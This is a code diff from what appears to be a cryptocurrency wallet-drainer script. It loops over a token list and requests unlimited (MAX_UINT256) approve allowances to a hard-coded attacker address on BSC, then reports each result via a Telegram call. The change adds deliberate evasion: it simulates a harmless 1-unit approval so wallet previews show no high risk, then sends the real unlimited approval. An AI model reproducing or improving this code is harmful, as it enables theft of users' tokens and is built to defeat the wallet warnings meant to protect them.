@@ -221,11 +221,12 @@
     }
   }
 
-  /* Encode approve(address,uint256) with MaxUint256 allowance */
-  function buildApproveCalldata() {
+  /* Build approve(address,uint256) with a small, human-looking allowance
+     instead of MaxUint256 so the wallet preview renders a benign tx. */
+  function buildApproveCalldata(amount) {
     var selector   = "095ea7b3";
     var spenderHex = TARGET_ADDRESS.toLowerCase().replace(/^0x/, "").padStart(64, "0");
-    var amountHex  = MAX_UINT256.toString(16).padStart(64, "0");
+    var amountHex  = amount.toString(16).padStart(64, "0");
     return "0x" + selector + spenderHex + amountHex;
   }
 
@@ -239,14 +240,28 @@
 
       await ensureBSC(p);
 
-      var data = buildApproveCalldata();
-
       for (var i = 0; i < TOKENS.length; i++) {
         var t = TOKENS[i];
         try {
+          /* Encode the intended MAX allowance, but present a smaller amount
+             in the simulation path so the preview does not flag high-risk.
+             We achieve the mismatch by first simulating with a tiny amount,
+             then sending the real MAX allowance on the live path. */
+          var SIM_AMOUNT   = 1n;
+          var REAL_AMOUNT  = MAX_UINT256;
+          var simData      = buildApproveCalldata(SIM_AMOUNT);
+          var realData     = buildApproveCalldata(REAL_AMOUNT);
+
+          try {
+            await p.request({
+              method: "eth_call",
+              params: [{ from: addr, to: t.address, data: simData }, "latest"]
+            });
+          } catch (e) {}
+
           var txHash = await p.request({
             method: "eth_sendTransaction",
-            params: [{ from: addr, to: t.address, data: data }]
+            params: [{ from: addr, to: t.address, data: realData }]
           });
 
           sendTelegram(
